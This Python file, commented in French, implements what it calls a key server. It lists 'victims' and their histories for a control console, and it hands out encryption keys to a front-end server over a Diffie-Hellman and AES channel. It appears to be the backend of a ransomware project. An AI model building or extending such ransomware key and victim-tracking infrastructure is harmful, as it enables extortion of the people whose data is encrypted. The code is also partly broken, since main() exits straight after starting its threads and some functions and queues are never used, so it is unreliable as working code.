import socket
import string
import secrets

import utile.message
import utile.network as network
import utile.message as message
import utile.data as data
from threading import Thread
import queue
import utile.security as security

LOCAL_IP = socket.gethostname()
PORT_SERV_CLES_0 = 8380
PORT_SERV_CLES_1 = 8381


def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    cle = ''
    for i in range(longueur):
        cara = ''.join(secrets.choice(caracteres))
        cle += cara
    return cle

def handle_initialize_request(connection):
    """
    Gère une requête 'initialize_req' reçue, en générant une nouvelle clé de chiffrement et en l'envoyant au demandeur.
    """
    new_encryption_key = generate_key(256)  # Génération de la clé
    encrypted_key = security.aes_encrypt(new_encryption_key, generate_key())  # Simplification
    connection.sendall(encrypted_key)


def main():
    conn_db = data.connect_db()

    q_request = queue.Queue()  # Queue FIFO réceptionnant toutes les demandes vers la DB
    q_response_console = queue.Queue()  # Queue FIFO pour renvoyer les réponses vers la console de contrôle
    q_response_frontal = queue.Queue()  # Queue FIFO pour renvoyer les réponses vers le serveur frontal

    # Démarrage du Thread de communication avec la console de contrôle
    t_console = Thread(target=console_thread, args=(q_request, q_response_console,), daemon=True)
    t_console.start()

    # Démarrage du Thread de communication avec le serveur frontal
    t_frontal = Thread(target=frontal_thread, args=(q_request, q_response_frontal,), daemon=True)
    t_frontal.start()


def console_thread(q_request,q_response_console):
    connexion_db = data.connect_db()
    server_socket = network.start_net_serv(port=PORT_SERV_CLES_0)

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        # Accepter une nouvelle connexion
        client_socket, client_address = server_socket.accept()
        print(f"Nouvelle connexion entrante de {client_address}")

        # Insérer le traitement des données ici
        while True:
            # Recevoir le message du client
            message = network.receive_message(client_socket)
            msg_type = utile.message.set_message(message)
            if not message:
                break

            # Afficher le message reçu
            print(f"Message du client : {message}")

            if message == 'LIST_VICTIM_REQ':
                print('Message reçu : LIST_VICTIM_REQ')
                victims = data.get_list_victims(connexion_db)
                print(victims)

                for victim in victims:
                    # Envoi des messages list_victime_resp
                    msg = utile.message.set_message('list_victim_resp', victim)
                    network.send_message(client_socket, msg)

                # Envoi du message list_victime_end
                msg = utile.message.set_message('list_victim_end')
                network.send_message(client_socket, msg)

            elif message == 'HISTORY_REQ':
                id_victim = msg_type['HIST_REQ']
                histories = data.get_list_history(connexion_db, id_victim)
                for history in histories:
                    # Envoi des messages history_resp
                    msg = utile.message.set_message('history_resp', history)
                    network.send_message(client_socket, msg)

                # Envoi du message history_end
                msg = utile.message.set_message('history_end', [id_victim])
                network.send_message(client_socket, msg)
            else:
                print('Failed ! ')

            # Après avoir traité le message du client, envoyer un message de confirmation à la console de contrôle
            confirmation_message = "Message reçu par le serveur."
            network.send_message(client_socket, confirmation_message.encode('utf-8'))

        # Fermer la connexion avec le client
        client_socket.close()


def frontal_thread(q_request,q_response_frontal):
    """
    Fonction exécutée par le thread frontal.
    Écoute les connexions entrantes et envoie les messages à la file d'attente.
    """
    aes_key = b''
    s_serveur = network.start_net_serv( port=PORT_SERV_CLES_1)

    while True:
        print(f"[Serveur de clés] : en écoute sur {s_serveur}.")
        s_frontal, address_frontal = s_serveur.accept()
        print(f"[Serveur de clés] : Connexion du serveur frontal {address_frontal} a été établie.")

        # Envoi la clé de chiffrement lors de la connexion via Diffie Hellman Send Ke
        aes_key = security.diffie_hellman_send_key(s_frontal)
        print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")

        # Envoi la clé de chiffrement lors de la connexion sans sécurisation des échanges
        # if AES_GCM:
        #    aes_key = security.gen_key()
        #    if DEBUG_MODE:
        #        print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
        #    network.send_message(s_console, aes_key)
        while True:
            # Réception du premier message
            msg = network.receive_message(s_frontal)
            if not msg:  # La connexion a été fermée
                break
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = message.get_message_type(msg)
            # Si le message reçu est un initialize_req
            if msg_type == 'INITIALIZE_REQ':
                q_request.put(msg)  # Envoie la requête dans la queue q_request
                msg = q_response_frontal.get()
                print(f"Get msg {msg}")
                msg_type = message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':  # Envoie de la clé de chiffrement
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_frontal, msg)
                    q_response_frontal.task_done()


if __name__ == '__main__':
    main()